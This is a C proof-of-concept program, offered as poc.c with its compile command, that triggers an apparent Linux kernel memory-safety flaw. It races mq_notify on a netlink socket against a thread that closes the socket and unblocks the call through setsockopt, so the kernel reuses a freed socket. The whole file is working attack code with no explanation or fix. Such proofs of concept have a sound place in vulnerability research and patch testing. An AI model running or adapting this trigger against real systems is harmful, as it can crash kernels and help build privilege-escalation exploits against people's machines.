//gcc poc.c -lpthread -o poc
#define _GNU_SOURCE
#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <errno.h>


#define SOL_NETLINK (270)
#define NOTIFY_COOKIE_LEN (32)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(fd,  level,  optname, optval, optlen) syscall(__NR_setsockopt, fd,  level,  optname, optval, optlen)
#define _dup(fd) syscall(__NR_dup,fd)
#define _close(fd) syscall(__NR_close,fd)

struct unblock_thread_arg {
    int fd;
    int unblock_fd;
    bool ok;
    // bool block;
};

void *unblock_thread(struct unblock_thread_arg *arg)
{
    // int optname = NETLINK_NO_ENOBUFS;
    int optlen = sizeof(int);
    int optval = 0x666;
    arg->ok = true;
    sleep(5);
    printf("close sock_fd:%d\n",arg->fd);
    _close(arg->fd);
    printf("close sock_fd succeed\n");
    printf("start to unblock\n");
    if(_setsockopt(arg->unblock_fd,  SOL_NETLINK,  NETLINK_NO_ENOBUFS, &optval, sizeof(int)))
        perror("setsockopt error");
    puts("unblocked");
    return NULL;
}

int triger(int fd,int unblock_fd)
{
    struct unblock_thread_arg arg;
    struct sigevent sigv;
    memset(&sigv,0,sizeof(sigv));
    memset(&arg,0,sizeof(arg));
    pthread_t tid;
    char user_buf[128];
    arg.ok = false;
    arg.fd = fd;
    arg.unblock_fd = unblock_fd;
    if(errno = pthread_create(&tid,NULL,unblock_thread,&arg))
    {
        perror("unblock thread create error");
        return -1;
    }
    printf("unblock thread created succeed\n");
    while(arg.ok == false);
    printf("sock_fd:%d,unblock_fd:%d\n",fd,unblock_fd);
    sigv.sigev_signo = fd;
    sigv.sigev_notify = SIGEV_THREAD;
    sigv.sigev_value.sival_ptr = user_buf;
    _mq_notify((mqd_t)-1,&sigv);
}

int main()
{

    int sock_fd=0;
    int sock_fd2=0;
    int unblock_fd=0;

    if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC))==0)
    {
        perror("socket");
        return -1;
    }
    printf("%d\n",sock_fd);
    printf("start to dup\n");
    if((sock_fd2=_dup(sock_fd))==0||(unblock_fd=_dup(sock_fd))==0)
    {
        perror("dup");
        return -2;
    }
    printf("dup succeed\n");
    triger(sock_fd,unblock_fd);
    triger(sock_fd2,unblock_fd);
    return 0;
}